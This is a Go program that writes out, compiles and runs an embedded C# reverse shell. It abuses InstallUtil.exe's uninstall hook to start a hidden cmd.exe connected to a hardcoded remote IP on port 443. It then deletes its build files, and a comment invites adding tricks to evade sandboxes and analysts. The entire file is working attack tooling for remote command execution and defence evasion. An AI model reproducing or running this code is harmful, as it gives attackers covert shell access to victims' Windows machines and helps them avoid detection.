package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var instutil, cscpath, instutilpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "192.168.20.13"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "443"

func init() {
	instutil = `using System;
	using System.ComponentModel;
	using System.Configuration.Install;
	using System.Diagnostics;
	using System.IO;
	using System.Net.Sockets;
	using System.Text;
	
	namespace Instutil
	{
		public class Program
		{
	
			public static void Main()
			{
				Console.WriteLine("Does not have any role here");
				//Add any behaviour here to throw off sandbox execution/analysts :)
	
			}
		}
	
		[RunInstaller(true)]
		public partial class ProjectInstaller : Installer
		{
			StreamWriter streamWriter;
	
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Console.WriteLine("The Uninstall method of 'RevShellInsaller' has been called");
				revconnect();
			}
	
			private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
			{
				StringBuilder strOutput = new StringBuilder();
	
				if (!String.IsNullOrEmpty(outLine.Data))
				{
					try
					{
						strOutput.Append(outLine.Data);
						streamWriter.WriteLine(strOutput);
						streamWriter.Flush();
					}
					catch (Exception) { }
				}
			}
			public void revconnect()
			{
				try
				{
					using (TcpClient client = new TcpClient("IPHERE", PORTHERE))
					{
						using (Stream stream = client.GetStream())
						{
							using (StreamReader rdr = new StreamReader(stream))
							{
								streamWriter = new StreamWriter(stream);
	
								StringBuilder strInput = new StringBuilder();
	
								Process p = new Process();
								p.StartInfo.FileName = "cmd.exe";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();
	
								while (true)
								{
									strInput.Append(rdr.ReadLine());
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
				}
				catch (Exception)
				{
	
	
				}
			}
		}
	}
	`
	cscpath = `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`
	instutilpath = `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createinstlutiltemplate(MANAGERIP, REMOTEPORT)
	buildpath := filepath.FromSlash(`C:\Windows\temp\build.bat`)
	buildbat, err := os.Create(buildpath)
	checkerr(err)
	//fmt.Println(buildpath)
	buildbat.WriteString(cscpath + " " + `/out:C:\Windows\temp\instut.exe` + " " + `C:\Windows\temp\insutil.cs`)
	buildbat.Close()
	err = exec.Command(buildpath).Run()
	checkerr(err)
	runinstutilpath := filepath.FromSlash(`C:\Windows\temp\runinstutil.bat`)
	runinst, err := os.Create(runinstutilpath)
	checkerr(err)
	//fmt.Println(runinstutilpath)
	runinst.WriteString(instutilpath + ` /logfile= /LogToConsole=false /U C:\Windows\temp\instut.exe`)
	runinst.Close()
	err = exec.Command(runinstutilpath).Run()
	checkerr(err)
	os.Remove(buildpath)
	os.Remove(runinstutilpath)
	os.Remove(`C:\Windows\temp\insutil.cs`)
}

func createinstlutiltemplate(ip, port string) {
	ipreplaced := strings.Replace(instutil, "IPHERE", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORTHERE", port, 1)
	foinstlutil, err := os.Create(`C:\Windows\temp\insutil.cs`)

	checkerr(err)
	foinstlutil.WriteString(portreplaced)
	foinstlutil.Close()

}
